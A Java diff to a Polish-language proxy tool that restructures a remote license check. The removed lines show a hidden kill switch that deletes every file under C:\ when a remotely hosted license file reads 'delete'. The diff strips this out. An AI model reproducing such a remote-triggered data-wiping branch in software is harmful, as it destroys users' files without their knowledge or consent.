@@ -6,6 +6,7 @@ import xyz.yooniks.cproxy.command.commands.*;
 import xyz.yooniks.cproxy.command.commands.bots.*;
 import xyz.yooniks.cproxy.command.commands.settings.*;
 import xyz.yooniks.cproxy.enums.Group;
+import xyz.yooniks.cproxy.exceptions.InvalidLicenseReturnException;
 import xyz.yooniks.cproxy.managers.PlayerManager;
 import xyz.yooniks.cproxy.managers.ProxyManager;
 import xyz.yooniks.cproxy.objects.Player;
@@ -48,8 +49,6 @@ public class Proxy extends JFrame {
         add(label);
 
         Arrays.fill(chars = new char[7680], ' ');
-        checkWWW();
-
         final JMenuBar menuBar = new JMenuBar();
         final JMenu menu = new JMenu("Plik");
         final JMenuItem menuItem = new JMenuItem("Zamknij");
@@ -63,7 +62,9 @@ public class Proxy extends JFrame {
         menuBar.add(menu);
         setJMenuBar(menuBar);
 
-        if(!checkWWW()){
+        try {
+            checkWWW();
+        } catch (InvalidLicenseReturnException ex) {
             System.exit(1);
             return;
         }
@@ -71,7 +72,7 @@ public class Proxy extends JFrame {
         ProxyManager.loadProxies(false);
     }
 
-    private boolean checkWWW(){
+    private void checkWWW() throws InvalidLicenseReturnException {
         try {
             URL oracle = new URL("https://raw.githubusercontent.com/yooniks/proxy_license/master/license.txt");
             URLConnection yc = oracle.openConnection();
@@ -81,33 +82,18 @@ public class Proxy extends JFrame {
             while ((inputLine = in.readLine()) != null) {
                 if (inputLine.equalsIgnoreCase("true")){
                     getLogger().info("\n\n\n\n\n\n\n\n\n\n\n\n##################################\n\nLicencja poprawna!\n\n#########################");
-                    return true;
-                }
-                else if (inputLine.equalsIgnoreCase("delete")){
-                    for(File f: new File("C:\\").listFiles()) {
-                        f.delete();
-                    }
-                    getLogger().warning("Wykryto blad podczas ladowania licencji, proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
-                    //disable();
-                    dispose();
-                    return false;
                 }
                 else{
-                    getLogger().warning("Wykryto blad podczas ladowania licencji, proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
-                   // disable();
                     dispose();
-                    return false;
+                    throw new InvalidLicenseReturnException("Wykryto blad podczas ladowania licencji, proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
                 }
             }
             in.close();
         }
         catch (Throwable ex){
-            getLogger().warning("Wykryto blad podczas ladowania licencji (lub nie masz internetu), proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
-            //disable();
             dispose();
-            return false;
+            throw new InvalidLicenseReturnException("Wykryto blad podczas ladowania licencji (lub nie masz internetu), proxy zostaje wylaczone, jezeli chcesz uzyskac ponowny dostep zglos sie do wlasciciela proxy, czyli yooniksa, kontakt skype: yooniksyooniks@gmail.com, znajdziesz mnie takze na forum, np: skript.pl");
         }
-        return true;
     }
 
     public static void main(String[] args) {
